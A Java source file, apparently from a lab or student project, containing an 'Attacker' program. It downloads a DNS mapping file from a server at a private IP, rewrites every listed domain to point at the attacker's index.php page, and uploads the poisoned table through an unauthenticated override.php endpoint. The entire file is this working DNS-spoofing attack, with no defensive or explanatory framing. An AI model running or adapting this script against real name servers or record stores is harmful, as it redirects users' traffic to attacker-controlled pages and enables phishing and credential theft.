import java.io.*;
import java.net.*;
import java.nio.charset.Charset;
import java.util.*;

public class Attacker {
    private static String IP = "192.168.43.75";
    private static Map<String,String> map;
    private static String file = "DNS.txt";
    public static void main(String[] args) {
        try {
            String s[] = makeHttpRequest(new URL("http://" + IP + "/" + file)).split(",|\\n");
            map = new HashMap<>();
            for(int i = 0; i < s.length ; i+=2)
            {
                map.put(s[i],IP + "/index.php");
            }
            Set<String> set = map.keySet();
            Iterator<String> iterator = set.iterator();
            String out = "";
            while (iterator.hasNext())
            {
                out = out + iterator.next() + "," + "http://" + IP + "/index.php" + " ";
            }
            makeHttpRequest(new URL("http://" + IP + "/override.php?file="+file+"&data=" + URLEncoder.encode(out,"UTF-8")));
        } catch (Exception e) {
            System.out.println("Error in attacking. Please check IP.");
            System.exit(1);
        }
        System.out.println("IPs CHANGED SUCCESSFULLY");
    }

    private static String makeHttpRequest(URL url) throws IOException {
        String response = "";
        if (url == null) {
            return response;
        }
        HttpURLConnection urlConnection = null;
        InputStream inputStream = null;
        try {
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("GET");
            urlConnection.setReadTimeout(10000);
            urlConnection.setConnectTimeout(15000);
            urlConnection.connect();
            inputStream = urlConnection.getInputStream();
            response = readFromStream(inputStream);
        } catch (IOException e) {
            response = null;
        } finally {
            if (urlConnection != null) {
                urlConnection.disconnect();
            }
            if (inputStream != null) {
                // function must handle java.io.IOException here
                inputStream.close();
            }
        }
        return response;
    }

    private static String readFromStream(InputStream inputStream) throws IOException {
        StringBuilder output = new StringBuilder();
        if (inputStream != null) {
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charset.forName("UTF-8"));
            BufferedReader reader = new BufferedReader(inputStreamReader);
            String line = reader.readLine();
            while (line != null) {
                output.append(line + "\n");
                line = reader.readLine();
            }
        }
        return output.toString();
    }
}
